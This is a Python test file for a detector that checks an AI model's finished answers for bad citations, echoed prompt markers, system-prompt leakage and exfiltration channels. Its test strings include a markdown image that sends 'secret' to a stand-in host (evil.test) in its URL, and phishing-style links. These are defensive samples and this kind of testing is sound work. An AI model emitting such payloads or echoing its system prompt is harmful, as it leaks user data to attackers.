"""Deterministic checks on a finished answer.

Hermetic. These are the layer that does not guess: concrete output in, yes or no
out. They are detectors rather than a gate, because the answer streams and the
caller has read it by the time it is complete.
"""

from knowledge_desk.outputchecks import check_answer
from knowledge_desk.providers import _SYSTEM, SYSTEM_CANARY

CTX = [{"path": "a.txt", "text": "one"}, {"path": "b.txt", "text": "two"}]


def codes(answer, contexts=CTX):
    return [f["code"] for f in check_answer(answer, contexts)]


def test_a_grounded_answer_raises_nothing():
    assert codes("Refunds take five business days [1], per the handbook [2].") == []


def test_the_canary_is_actually_in_the_system_prompt():
    """Otherwise the check tests nothing and nobody finds out."""
    assert SYSTEM_CANARY in _SYSTEM


# --- citations ------------------------------------------------------------


def test_a_citation_beyond_the_retrieved_passages_is_flagged():
    assert codes("As stated in [7], refunds are instant.") == ["citation_out_of_range"]


def test_citation_zero_is_flagged():
    assert codes("See [0].") == ["citation_out_of_range"]


def test_every_out_of_range_citation_is_named_once():
    finding = check_answer("See [7], [9], and [7] again.", CTX)[0]
    assert "[7]" in finding["detail"] and "[9]" in finding["detail"]


def test_a_refusal_with_no_passages_cites_nothing():
    assert codes("I don't have anything I'm allowed to cite.", []) == []


# --- prompt structure coming back out -------------------------------------


def test_an_echoed_fence_marker_is_flagged():
    assert "fence_echoed" in codes("The passage began at <<<UNTRUSTED_DOCUMENT 1a2b>>>.")


def test_an_echoed_marker_spelled_with_a_lookalike_is_still_flagged():
    """An output check that reads bytes is exactly where a respelling is most
    embarrassing, because this is the layer meant to be reliable."""
    assert "fence_echoed" in codes("It said <<<UNTRUSTED_DОCUMENT 1a2b>>> first.")


def test_an_echoed_system_prompt_is_flagged():
    assert "system_prompt_echoed" in codes(f"My instructions say: {SYSTEM_CANARY} ...")


# --- exfiltration channels ------------------------------------------------


def test_a_markdown_image_is_flagged():
    assert "markdown_image" in codes("Done ![](https://evil.test/x.png?d=secret)")


def test_a_markdown_link_is_flagged():
    assert "markdown_link" in codes("See [the portal](https://evil.test/login).")


def test_an_image_is_not_also_counted_as_a_link():
    assert codes("![alt](https://evil.test/x.png)") == ["markdown_image"]


def test_a_bare_url_in_prose_is_deliberately_not_flagged():
    """The honest boundary of this layer. A prose phishing link has no structural
    handle, and catching it needs domain reputation rather than a regex. Asserted
    so the omission is a decision on the record instead of an oversight."""
    assert codes("For help visit https://evil.test/support and sign in.") == []
